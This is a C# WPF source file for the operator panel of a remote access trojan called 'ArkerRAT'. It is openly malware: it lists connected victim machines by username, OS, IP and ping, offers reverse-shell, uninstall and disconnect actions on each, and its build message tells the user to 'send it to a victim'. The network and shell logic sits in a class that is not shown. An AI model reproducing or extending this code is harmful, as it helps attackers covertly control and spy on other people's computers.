using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace ArkerRAT1
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            Thread updateThread = new Thread(new ThreadStart(UpdateUI));
            updateThread.SetApartmentState(ApartmentState.STA);
            updateThread.Start();
            this.WindowState = WindowState.Normal;
            this.Activate();
        }

        int oldCount = 0;
        private void UpdateUI()
        {
            while (true)
            {
               if(ArkerRATServerMechanics.RATClients.Count() != oldCount)
                {
                    oldCount = ArkerRATServerMechanics.RATClients.Count();
                    this.Dispatcher.Invoke(() =>
                    {
                        clientAmountLabel.Content = ArkerRATServerMechanics.RATClients.Count();
                        serverAmountLabel.Content = 0;
                    });
                }
                
                Thread.Sleep(1000);
                this.Dispatcher.Invoke(() =>
                {
                    LoadCLients();
                });
            }
        }


        private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {

        }
        //________________________________________________________________________________________________________

        //Custome buttons top right
        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void ipInput_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            ArkerRATServerMechanics.StopListener();

            Environment.Exit(0);
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {

        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        //________________________________________________________________________________________________________

        //Clients name sorter
        private void Button_Click_3(object sender, RoutedEventArgs e)
        {

        }

        //OS sorter
        private void Button_Click_4(object sender, RoutedEventArgs e)
        {

        }

        //Ip-dress sorter
        private void Button_Click_5(object sender, RoutedEventArgs e)
        {

        }

        //Ping/ms sorter
        private void Button_Click_6(object sender, RoutedEventArgs e)
        {

        }

        //Refresh
        private void Button_Click_7(object sender, RoutedEventArgs e)
        {
            LoadCLients();
        }

        //Search
        private void Button_Click_8(object sender, RoutedEventArgs e)
        {

        }

        private void ScrollBar_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {

        }
        //________________________________________________________________________________________________________
        //Settings
        private void crypterOn_Checked(object sender, RoutedEventArgs e)
        {
            this.Opacity = 0.95;   
        }

        private void crypterOff_Checked(object sender, RoutedEventArgs e)
        {
            this.Opacity = 1;
        }
        //_________________________________________________________________________________________________________

        //Program

        private delegate void LoadClientsFromOtherThread(ListBox listbox);

        private void Build(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("ArkerRAT has been compiled SUCCESSFULLY send it to a victim, and start listening for conections at the network tab. " +
               "All the available clients will be shown at the clients tab.");
        }

        int check = 1;
        private void Listener(object sender, RoutedEventArgs e)
        {
            ArkerRATServerMechanics.port = Convert.ToInt32(portInput.Text);
            //Every other time it should stop the listener -1*-1 or 1*-1.
            check = check * -1;
            if (check == -1)
            {
                try
                {
                    listenerButton.Content = "Stop listening";
                    ArkerRATServerMechanics.StartServer();
                }
                catch (Exception ex)
                {
                    listenerButton.Content = "Start listening";
                }
            }
            else
            {
                ArkerRATServerMechanics.StopListener();
                listenerButton.Content = "Start listening for connections";
            }
        }

        public void CyperTools(Button clientButton)
        {
            MenuItem reversShellButton = new MenuItem();
            reversShellButton.Header = "Reverse-shell";
            reversShellButton.Icon = new System.Windows.Controls.Image
            {
                Stretch = Stretch.Fill,
                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\bin\\Debug\\icons\\cmd.png"))
            };

            MenuItem unInstall = new MenuItem();
            unInstall.Header = "Uninstall client";
            unInstall.Icon = new System.Windows.Controls.Image
            {
                Stretch = Stretch.Fill,
                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\bin\\Debug\\icons\\remove.png"))
            };

            MenuItem disconnect = new MenuItem();
            disconnect.Header = "Disconnect client";
            disconnect.Icon = new System.Windows.Controls.Image
            {
                Stretch = Stretch.Fill,
                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\bin\\Debug\\icons\\remove.png"))
            };

            clientButton.ContextMenu = new ContextMenu();
            clientButton.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
            clientButton.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));

            clientButton.ContextMenu.Items.Add(reversShellButton);
            clientButton.ContextMenu.Items.Add(unInstall);
            clientButton.ContextMenu.Items.Add(disconnect);

            clientButton.ContextMenu.Visibility = Visibility.Visible;

            for (int y = 0; y < ArkerRATServerMechanics.RATClients.Count; y++)
            {
                if (ArkerRATServerMechanics.RATClients[y].clientButton.Tag as string == clientButton.Tag as string)
                {
                    reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.RATClients[y].StartReverseShell);
                    unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.RATClients[y].Uninstall);
                    disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.RATClients[y].Disconnect);
                }
            }            
        }

        public void LoadCLients()
        {
            try
            {
                loadClients.Items.Clear();
                for (int y = 0; y < ArkerRATServerMechanics.RATClients.Count; y++)
                {
                    ArkerRATServerMechanics.RATClients[y].clientButton.Width = 700;
                    ArkerRATServerMechanics.RATClients[y].clientButton.Height = 50;
                    System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
                    System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
                    ArkerRATServerMechanics.RATClients[y].clientButton.BorderBrush = new SolidColorBrush(arkerPurple);
                    ArkerRATServerMechanics.RATClients[y].clientButton.Foreground = new SolidColorBrush(arkerPurple);
                    ArkerRATServerMechanics.RATClients[y].clientButton.Background = new SolidColorBrush(arkerGrey);
                    ArkerRATServerMechanics.RATClients[y].clientButton.Content = ArkerRATServerMechanics.RATClients[y].userName + "                      " + ArkerRATServerMechanics.RATClients[y].OSVersion +"                      " + ArkerRATServerMechanics.RATClients[y].iPadress+ "                            " + ArkerRATServerMechanics.RATClients[y].ms+"ms";
                    loadClients.Items.Add(ArkerRATServerMechanics.RATClients[y].clientButton);
                    CyperTools(ArkerRATServerMechanics.RATClients[y].clientButton);
                }
            }
            catch (Exception ex)
            {

            }

        }
    }
}